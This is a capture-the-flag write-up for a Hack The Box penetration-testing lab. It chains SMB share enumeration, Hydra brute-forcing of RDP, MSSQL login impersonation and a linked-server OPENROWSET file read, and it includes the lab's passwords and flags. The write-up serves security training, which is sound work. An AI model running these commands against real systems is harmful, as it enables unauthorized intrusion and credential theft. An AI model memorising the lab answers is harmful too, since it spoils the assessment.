### CPTS / HTB Penetration Tester Path <br>
### Attacking Common Services - Skills Assessment Hard <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Attacking Common Services - Hard

Internal Inlanefreight server managing files / forms with an unknown-purpose database.

---

### Question 1:
What file can you retrieve that belongs to the user "simon"? (Format: filename.txt)

IP: 10.129.203.10

#### Map domains and run a comprehensive scan.

```diff
+ $ echo "10.129.203.10     inlanefreight.htb     ns1.inlanefreight.htb" | sudo tee -a /etc/hosts
+ $ sudo nmap -sT -sC -sV -A -v -p- 10.129.203.10
```

	135/tcp   open  msrpc          Microsoft Windows RPC
	445/tcp   open  microsoft-ds
	1433/tcp  open  ms-sql-s       MSSQL Server 2019 RTM (WIN-HARD)
	3389/tcp  open  ms-wbt-server  MS Terminal Services

#### Enumerate SMB shares as `simon`:

```diff
+ $ smbmap -u 'simon' -H inlanefreight.htb
```

	Disk    Permissions    Comment
	----    -----------    -------
	Home    READ ONLY

#### List the Home share recursively, then null-session in to grab files:

```diff
+ $ smbmap -u 'simon' -H inlanefreight.htb -r Home
+ $ smbclient -N //10.129.203.10/Home
+ smb: \> mget *
```

#### Inside the IT folder, found `Fiona_creds.txt`, `John_pws.txt`, and `random.txt` (Simon's file).

&#x1F6A9; found **random.txt**.

---

### Question 2:
Enumerate the target and find a password for the user Fiona. What is her password?

#### Hydra against RDP using the captured `Fiona_creds.txt`:

```diff
+ $ hydra -l fiona -P Fiona_creds.txt rdp://10.129.203.10
```

	[3389][rdp] host: 10.129.203.10   login: fiona   password: 48Ns72!bns74@S84NNNSl

&#x1F6A9; found **48Ns72!bns--edit--74@S84NNNSl**.

---

### Question 3:
Once logged in, what other user can we compromise to gain admin privileges?

Hint: There are two users we can impersonate.

#### From the share, only John remains untested.

&#x1F6A9; found **John**.

---

### Question 4:
Submit the contents of the flag.txt file on the Administrator Desktop

#### RDP in as Fiona:

```diff
+ $ xfreerdp /v:10.129.203.10 /u:Fiona /p:'48Ns72!bns74@S84NNNSl' /dynamic-resolution
```

#### From cmd, launch sqlcmd and impersonate `john`:

```diff
+ C:\Users\Fiona> sqlcmd
+ 1> execute as login = 'john';
+ 2> select system_user;
+ 3> select IS_SRVROLEMEMBER('sysadmin');
+ 4> go
```

#### Find linked servers:

```diff
+ 1> select srvname, isremote from sysservers;
+ 2> go
```

	srvname                       isremote
	WINSRV02\SQLEXPRESS                 1
	LOCAL.TEST.LINKED.SRV               0

#### Probe the linked server - `testadmin` is sysadmin:

```diff
+ 1> EXECUTE('SELECT @@servername, @@version, SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [local.test.linked.srv];
+ 2> go
```

#### Use `OPENROWSET` against the linked server to read the flag:

```diff
+ 1> execute ('select * from OPENROWSET(BULK ''C:/Users/Administrator/desktop/flag.txt'', SINGLE_CLOB) AS Contents') at [local.test.linked.srv];
+ 2> go
```

	HTB{46u$!n9_l!nk3d_$3rv3r$}

&#x1F6A9; found **HTB{46u$!n9_l--edit--!nk3d_$3rv3r$}**.
